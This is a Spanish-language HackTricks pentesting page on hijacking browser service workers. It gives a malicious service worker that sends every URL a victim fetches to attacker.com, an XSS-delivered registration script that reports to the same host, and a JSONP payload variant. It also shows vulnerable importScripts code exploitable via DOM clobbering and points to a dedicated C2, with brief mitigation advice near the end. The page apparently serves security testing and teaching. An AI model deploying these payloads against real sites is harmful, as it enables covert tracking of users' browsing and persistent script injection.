# Abuso de Service Workers

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci√≥n b√°sica

Un service worker es un **script** que tu navegador **ejecuta** en segundo plano, separado de una p√°gina web, abriendo la puerta a caracter√≠sticas que no necesitan una p√°gina web o interacci√≥n del usuario. ([M√°s informaci√≥n sobre qu√© es un service worker aqu√≠](https://developers.google.com/web/fundamentals/primers/service-workers)).\
Luego, se podr√≠a abusar de los service workers **cre√°ndolos/modific√°ndolos** en la **sesi√≥n de la v√≠ctima** dentro del **dominio web vulnerable** que otorga al atacante el control sobre **todas las p√°ginas** que la **v√≠ctima** cargar√° en **ese dominio**.

### Verificar SWs existentes

Puedes verlos en el campo de **Service Workers** en la pesta√±a de **Application** de las **Herramientas para desarrolladores**. Tambi√©n puedes mirar en [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals).

### Notificaciones push

Si la v√≠ctima no otorg√≥ permisos de **notificaciones push**, el service worker **no podr√° recibir comunicaciones del servidor si el usuario no accede a la p√°gina del atacante nuevamente**. Esto **evitar√°**, por ejemplo, mantener conversaciones con todas las p√°ginas que accedieron a la p√°gina web del atacante, por lo que si se encuentra una vulnerabilidad, el SW puede recibirla y ejecutarla.\
Sin embargo, si la v√≠ctima **otorga permisos de notificaciones push, esto podr√≠a ser un riesgo**.

## Ataque creando un Service Worker

Para explotar esta vulnerabilidad, necesitas encontrar:

* Una forma de **subir archivos JS arbitrarios** al servidor y un **XSS para cargar el service worker** del archivo JS cargado
* Una **solicitud JSONP vulnerable** donde puedas **manipular la salida (con c√≥digo JS arbitrario)** y un **XSS** para **cargar el JSONP con un payload** que **cargar√° un service worker malicioso**.

En el siguiente ejemplo, voy a presentar un c√≥digo para **registrar un nuevo service worker** que escuchar√° el evento `fetch` y **enviar√° al servidor del atacante cada URL recuperada** (este es el c√≥digo que necesitar√≠as **subir** al **servidor** o cargar a trav√©s de una **respuesta JSONP vulnerable**):
```javascript
self.addEventListener('fetch', function(e) {
  e.respondWith(caches.match(e.request).then(function(response) {
    fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Y este es el c√≥digo que **registrar√° el worker** (el c√≥digo que deber√≠as ser capaz de ejecutar aprovechando un **XSS**). En este caso, se enviar√° una solicitud **GET** al servidor del **atacante** **notificando** si el **registro** del service worker fue exitoso o no:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
  .then(function(registration) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/success", true);
    xhttp2.send();
  }, function (err) {
    var xhttp2 = new XMLHttpRequest();
    xhttp2.open("GET", "https://attacker.com/SW/error", true);
    xhttp2.send();
  });
});
</script>
```
En caso de abusar de un punto final JSONP vulnerable, debes colocar el valor dentro de `var sw`. Por ejemplo:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Hay un **C2** dedicado a la **explotaci√≥n de Service Workers** llamado [**Shadow Workers**](https://shadow-workers.github.io) que ser√° muy √∫til para abusar de estas vulnerabilidades.

En una situaci√≥n de XSS, la directiva de cach√© de 24 horas asegura que un SW malicioso o comprometido sobrevivir√° a una soluci√≥n para la vulnerabilidad de XSS por un m√°ximo de 24 horas (suponiendo que el cliente est√© en l√≠nea). Los operadores del sitio pueden reducir la ventana de vulnerabilidad estableciendo TTL m√°s bajos en los scripts de SW. Tambi√©n alentamos a los desarrolladores a [crear un SW de interruptor de matar](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776).

## Abusando de `importScripts` en un SW a trav√©s de DOM Clobbering

La funci√≥n **`importScripts`** llamada desde un Service Worker puede **importar un script de un dominio diferente**. Si esta funci√≥n se llama usando un **par√°metro que un atacante podr√≠a** modificar, podr√≠a **importar un script JS desde su dominio** y obtener XSS.

**Esto incluso evade las protecciones CSP.**

**C√≥digo vulnerable de ejemplo:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
  // attacker controls location.search
</script>
```
* **sw.js**

El archivo `sw.js` (Service Worker) es un script que se ejecuta en segundo plano en el navegador del usuario y se utiliza para proporcionar una experiencia de usuario mejorada. Los Service Workers pueden interceptar y modificar solicitudes de red, lo que los hace √∫tiles para implementar funciones como la cach√© de contenido y las notificaciones push. Sin embargo, tambi√©n pueden ser abusados para llevar a cabo ataques XSS (Cross-Site Scripting) y filtraciones de informaci√≥n.
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Con DOM Clobbering

Para obtener m√°s informaci√≥n sobre qu√© es el DOM Clobbering, consulte:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Si la URL / dominio que el SW est√° utilizando para llamar a **`importScripts`** est√° **dentro de un elemento HTML**, es **posible modificarlo a trav√©s de DOM Clobbering** para hacer que el SW **cargue un script desde su propio dominio**.

Para un ejemplo de esto, consulte el enlace de referencia.

## Referencias

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
